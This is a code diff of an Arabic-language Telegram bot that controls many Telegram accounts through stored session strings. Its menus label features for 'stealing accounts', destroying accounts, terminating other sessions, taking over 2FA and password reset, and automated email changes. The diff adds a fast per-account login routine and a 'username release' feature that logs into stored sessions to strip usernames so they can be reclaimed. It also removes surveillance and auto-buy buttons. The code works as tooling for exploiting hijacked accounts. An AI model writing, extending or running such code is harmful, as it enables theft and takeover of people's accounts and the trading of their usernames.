@@ -2453,23 +2453,21 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
     markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
     markup.row(InlineKeyboardButton("• إدارة الـريـسـت والـقـفـل 🔒", callback_data="menu_pass_reset_manage"))
+    
+    # الزر الجديد المضاف هنا
+    markup.row(InlineKeyboardButton("• إدارة فـحـص الـيـوزرات 🔠", callback_data="usernames_manage"))
+    
     markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
     markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
     markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
     markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
     markup.row(InlineKeyboardButton("• أتمتة تغيير الإيميل السريع 📧", callback_data="auto_email_menu"))
-    markup.row(InlineKeyboardButton("• صـيـد كـنـوز الـمـجـمـوعـات 🏴‍☠️", callback_data="treasure_hunter_menu"))
 
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
-        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))
+        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"))
         markup.row(InlineKeyboardButton("• تـدمـيـر وحـذف الـحـسـابـات 🔴", callback_data="admin_destroy_accounts"))
-
-        # 👑 تمت إضافة زر القنص هنا للآدمن فقط
-        markup.row(InlineKeyboardButton("🛒 تخصيص الشراء التلقائي (LZT)", callback_data="auto_buy_menu"))
-        markup.row(InlineKeyboardButton("🎵 الشراء التلقائي (تيك توك)", callback_data="tt_auto_main"))
-
     return markup
 
 
@@ -3250,62 +3248,58 @@ def back_home(call):
 
 
 
-
-
-
-
-import html  # مكتبة مدمجة في بايثون لتنظيف النصوص وتجنب أخطاء التنسيق
+import html
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
+# دالة مساعدة لجلب معلومات الحسابات بسرعة 50 اتصال
+async def fetch_account_info_fast(acc_id, phone, name, uid, pyro_session):
+    async with account_semaphore:
+        client = Client(f"rev_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=8)
+            me = await client.get_me()
+            await client.disconnect()
+            return acc_id, phone, name, uid, me
+        except Exception:
+            if client.is_connected:
+                await client.disconnect()
+            return acc_id, phone, name, uid, None
+
 @bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
 def reveal_accounts(call):
-    if not is_allowed(call.from_user.id): 
-        return
-
+    if not is_allowed(call.from_user.id): return
     accounts = get_all_accounts(call.from_user.id)
+    if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
 
-    if not accounts: 
-        return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
+    bot.edit_message_text("⏳ **جـاري فـحـص وجـلـب بـيـانـات الـحـسـابـات...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
-    bot.answer_callback_query(call.id, "⏳ جاري تجهيز كشف الحسابات...")
+    # جلب بيانات اليوزرات سريعاً
+    tasks = [fetch_account_info_fast(acc[0], acc[1], acc[2], acc[3], acc[4]) for acc in accounts]
+    fetched_data = run_async(asyncio.gather(*tasks))
 
-    # تقسيم الحسابات إلى دفعات (15 حساب في كل رسالة لتجنب تخطي الحد الأقصى لطول الرسالة)
     batch_size = 15
-    account_batches = [accounts[i:i + batch_size] for i in range(0, len(accounts), batch_size)]
-    total_accounts = len(accounts)
-
+    account_batches = [fetched_data[i:i + batch_size] for i in range(0, len(fetched_data), batch_size)]
+    
     for index, batch in enumerate(account_batches):
-        if index == 0:
-            text = f"<b>🛂┊ كشـف الحـسـابات -</b>\n\n<b>⎉╎ تم العثور على {total_accounts} حـسـاب</b>\n\n"
-        else:
-            text = f"<b>🛂┊ تـكـمـلـة الـحـسـابـات (الـجـزء {index + 1}):</b>\n\n"
-
-        for account in batch:
-            # تفكيك عناصر الحساب بأمان لتجنب توقف الدالة في حال تغير عدد الأعمدة في قاعدة البيانات
-            try:
-                acc_id = account[0] if len(account) > 0 else "غير معروف"
-                phone = account[1] if len(account) > 1 else "غير معروف"
-                name = account[2] if len(account) > 2 else "بلا اسم"
-                uid = account[3] if len(account) > 3 else "غير معروف"
-            except Exception:
-                continue  # تخطي هذا الحساب فقط إذا حدث خطأ غير متوقع في قراءة بياناته
-
-            # تنظيف النصوص القادمة من قاعدة البيانات لتجنب أخطاء تنسيق HTML في التليجرام
+        text = f"<b>🛂┊ كشـف الحـسـابات ({len(accounts)} حـسـاب):</b>\n\n" if index == 0 else f"<b>🛂┊ تـكـمـلـة الـحـسـابـات (الـجـزء {index + 1}):</b>\n\n"
+        
+        for acc_id, phone, name, uid, me in batch:
             safe_phone = html.escape(str(phone))
-            safe_name = html.escape(str(name))
             safe_uid = html.escape(str(uid))
+            creation_year = get_creation_year(uid)
+            
+            # تحديد اليوزر أو الاسم
+            if me and me.username:
+                display_name = f"@{html.escape(me.username)}"
+            elif me and me.first_name:
+                display_name = html.escape(me.first_name)
+            else:
+                display_name = html.escape(str(name))
 
-            # جلب سنة الإنشاء مع معالجة الأخطاء لضمان عدم توقف الدالة
-            try:
-                creation_year = get_creation_year(uid)
-            except Exception:
-                creation_year = "غير معروف"
-
-            # تركيب نص الحساب بتنسيق HTML آمن
             text += (
                 f"▪️ <b>الـرقـم:</b> {safe_phone}\n"
-                f"▪️ <b>الاسـم:</b> {safe_name}\n"
+                f"▪️ <b>الاسـم/الـيـوزر:</b> {display_name}\n"
                 f"▪️ <b>الآيـدي:</b> {safe_uid}\n"
                 f"▪️ <b>سـنـة الإنـشـاء:</b> {creation_year}\n"
                 f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
@@ -3314,26 +3308,19 @@ def reveal_accounts(call):
         is_last_batch = (index == len(account_batches) - 1)
         markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home")) if is_last_batch else None
 
-        try:
-            if index == 0:
-                bot.edit_message_text(
-                    text, 
-                    call.message.chat.id, 
-                    call.message.message_id, 
-                    reply_markup=markup, 
-                    parse_mode="HTML"
-                )
-            else:
-                bot.send_message(
-                    call.message.chat.id, 
-                    text, 
-                    reply_markup=markup, 
-                    parse_mode="HTML"
-                )
-                time.sleep(0.3)
-        except Exception as e:
-            # طباعة الخطأ في الكونسول لتسهيل تتبعه وتجنب انهيار البوت كاملاً
-            print(f"حدث خطأ أثناء إرسال الدفعة {index}: {e}")
+        if index == 0:
+            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
+        else:
+            bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="HTML")
+            time.sleep(0.3)
+           
+          
+         
+        
+       
+      
+     
+     
 
 @bot.callback_query_handler(func=lambda call: call.data == "view_sessions_menu")
 def view_sessions_menu(call):
@@ -3395,7 +3382,177 @@ def show_sessions_by_type(call):
 
 
 
+# ==========================================
+# 🔠 منظومة إدارة وتحرير اليوزرات السريعة
+# ==========================================
 
+@bot.callback_query_handler(func=lambda call: call.data == "usernames_manage")
+def usernames_manage_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🔍 فـحـص الـيـوزرات", callback_data="usernames_check"))
+    markup.row(InlineKeyboardButton("🗑️ تـحـريـر الـيـوزرات", callback_data="usernames_release_menu"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))
+    
+    text = (
+        "🛂┊ **إدارة فـحـص وتـحـريـر الـيـوزرات:**\n\n"
+        "⎉╎ **فـحـص:** يـعـرض كـافـة يـوزرات الـحـسـابـات مـع أرقـامـهـا.\n"
+        "⎉╎ **تـحـريـر:** يـتـيـح لـك إزالـة الـيـوزر مـن أي حـسـاب لـيـصـبـح مـتـاحـاً."
+    )
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "usernames_check")
+def usernames_check_action(call):
+    if not is_allowed(call.from_user.id): return
+    bot.edit_message_text("⏳ **جـاري فـحـص يـوزرات الـحـسـابـات بـسـرعـة...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    
+    accounts = get_all_accounts(call.from_user.id)
+    tasks = [fetch_account_info_fast(acc[0], acc[1], acc[2], acc[3], acc[4]) for acc in accounts]
+    fetched_data = run_async(asyncio.gather(*tasks))
+    
+    text = "🛂┊ **نـتـيـجـة فـحـص الـيـوزرات:**\n\n"
+    for acc_id, phone, name, uid, me in fetched_data:
+        if me and me.username:
+            user_display = f"@{me.username}"
+        else:
+            user_display = "----"
+        text += f"⎉╎ {user_display} | `{phone}`\n"
+        
+    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "usernames_release_menu")
+def usernames_release_menu(call):
+    if not is_allowed(call.from_user.id): return
+    bot.edit_message_text("⏳ **جـاري جـلـب الـحـسـابـات الـتـي تـحـتـوي عـلـى يـوزرات...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    
+    accounts = get_all_accounts(call.from_user.id)
+    tasks = [fetch_account_info_fast(acc[0], acc[1], acc[2], acc[3], acc[4]) for acc in accounts]
+    fetched_data = run_async(asyncio.gather(*tasks))
+    
+    markup = InlineKeyboardMarkup()
+    has_usernames = False
+    
+    for acc_id, phone, name, uid, me in fetched_data:
+        if me and me.username:
+            has_usernames = True
+            markup.row(InlineKeyboardButton(f"@{me.username} | {phone}", callback_data=f"act_release:{acc_id}"))
+            
+    if has_usernames:
+        markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="act_release:all"))
+    
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
+    
+    # تفعيل حالة التحرير لانتظار الـ @
+    USER_STATES[call.from_user.id] = {"action": "wait_for_username_release"}
+    
+    if has_usernames:
+        text = "🛂┊ **تـحـريـر الـيـوزرات:**\n\n⎉╎ اخـتـر يـوزراً لـتـحـريـره أو أرسـل الـيـوزر بـالـشـكـل `@user`"
+    else:
+        text = "❌ **لا يـوجـد أي حـسـاب يـحـتـوي عـلـى يـوزر حـالـيـاً.**"
+        
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+# دالة التحرير الفعلية عبر الأزرار
+@bot.callback_query_handler(func=lambda call: call.data.startswith("act_release:"))
+def execute_release_username(call):
+    if not is_allowed(call.from_user.id): return
+    target = call.data.split(":")[1]
+    
+    bot.edit_message_text("⏳ **جـاري تـحـريـر الـيـوزر(ات)...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    
+    async def do_release(acc_id, pyro_session):
+        async with account_semaphore:
+            client = Client(f"rel_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+            try:
+                await asyncio.wait_for(client.connect(), timeout=8)
+                await client.set_username(None)  # هذا الأمر يحذف اليوزر من الحساب
+                await client.disconnect()
+                return True
+            except Exception:
+                if client.is_connected: await client.disconnect()
+                return False
+
+    async def release_all():
+        accounts = get_all_accounts(call.from_user.id)
+        if target != "all":
+            accounts = [a for a in accounts if str(a[0]) == target]
+            
+        tasks = [do_release(acc[0], acc[4]) for acc in accounts]
+        results = await asyncio.gather(*tasks)
+        
+        success_count = sum(1 for r in results if r)
+        
+        msg = (
+            f"**⎉╎ تـمـت تـحـريـر الـيـوزر بـنـجـاح!**\n"
+            f"**⎉╎ الـنـجـاح:** `{success_count}` حـسـاب\n\n"
+            f"**🛂┊ انـتـظـر 5 دقـائـق قـبـل اسـتـخـدام الـيـوزر.**"
+        )
+        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
+        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    run_async(release_all())
+
+# استقبال الـ @ والـ @@ للتحرير عبر النص
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('@') or m.text.startswith('@@')))
+def handle_text_username_release(message):
+    uid = message.from_user.id
+    if not is_allowed(uid): return
+    
+    text = message.text.strip()
+    target_username = None
+    
+    # فحص نوع الرد
+    if text.startswith('@@'):
+        target_username = text[2:].lower() # إزالة الـ @@
+    elif text.startswith('@'):
+        state = USER_STATES.get(uid, {}).get("action")
+        if state == "wait_for_username_release":
+            target_username = text[1:].lower() # إزالة الـ @
+        else:
+            return # إذا أرسل @ واحدة وهو خارج قسم التحرير، البوت لا يتجاوب
+            
+    if not target_username: return
+    
+    status_msg = bot.reply_to(message, f"🛂 **جـاري الـبـحـث عـن `{target_username}` وتـحـريـره...**", parse_mode="Markdown")
+    
+    async def find_and_release(target):
+        accounts = get_all_accounts(uid)
+        
+        # دالة للبحث والتحرير الداخلي
+        async def check_and_remove(acc_id, pyro_session):
+            async with account_semaphore:
+                client = Client(f"sc_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=8)
+                    me = await client.get_me()
+                    if me and me.username and me.username.lower() == target:
+                        await client.set_username(None)
+                        await client.disconnect()
+                        return True
+                    await client.disconnect()
+                except Exception:
+                    if client.is_connected: await client.disconnect()
+                return False
+
+        tasks = [check_and_remove(acc[0], acc[4]) for acc in accounts]
+        results = await asyncio.gather(*tasks)
+        
+        if any(results):
+            return True
+        return False
+        
+    success = run_async(find_and_release(target_username))
+    
+    if success:
+        msg = (
+            f"**⎉╎ تـمـت تـحـريـر الـيـوزر `@{(target_username)}` بـنـجـاح!**\n\n"
+            f"**🛂┊ انـتـظـر 5 دقـائـق قـبـل إضـافـتـه لـحـسـابـك.**"
+        )
+    else:
+        msg = f"❌ **لـم يـتـم الـعـثـور عـلـى الـيـوزر `@{(target_username)}` فـي أي حـسـاب تـمـلـكـه.**"
+        
+    bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode="Markdown")
 
 
 
